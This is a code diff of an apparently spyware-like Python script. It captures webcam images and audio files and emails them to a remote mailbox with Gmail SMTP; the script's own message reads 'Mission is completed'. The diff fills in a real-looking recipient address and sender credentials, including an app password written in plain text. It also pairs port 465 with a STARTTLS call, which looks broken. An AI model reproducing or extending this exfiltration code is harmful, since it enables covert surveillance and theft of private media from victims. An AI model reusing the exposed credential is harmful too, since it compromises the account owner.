@@ -70,14 +70,14 @@ def webcam(file_path):
 #Email system function #
 def email_base(name, email_address):
     name['From'] = email_address
-    name['To'] =  'test123@gmail.com'
+    name['To'] =  'tanisharathi8@gmail.com'
     name['Subject'] = 'Success!!!'
     body = 'Mission is completed' 
     name.attach(MIMEText(body, 'plain'))
     return name
 
 def smtp_handler(email_address, password, name):
-    s = smtplib.SMTP('smtp.gmail.com', 587)
+    s = smtplib.SMTP('smtp.gmail.com', 465)
     s.starttls()
     s.login(email_address, password)
     s.sendmail(email_address, email_address, name.as_string())
@@ -90,8 +90,8 @@ def send_email(path):                               # Email sending function #
     regex4 = re.compile(r'.+\.jpg$')
     regex5 = re.compile(r'.+\.wav$')
 
-    email_address = 'QuiteHacker@instagram.com'         #<--- Enter your email address
-    password = 'QuiteHacker@2021'                       #<--- Enter email password 
+    email_address = 'atharvagokhalejp@gmail.com'         #<--- Enter your email address
+    password = 'dvzfecfngvwxlscv'                       #<--- Enter app password
     
     msg = MIMEMultipart()
     email_base(msg, email_address)
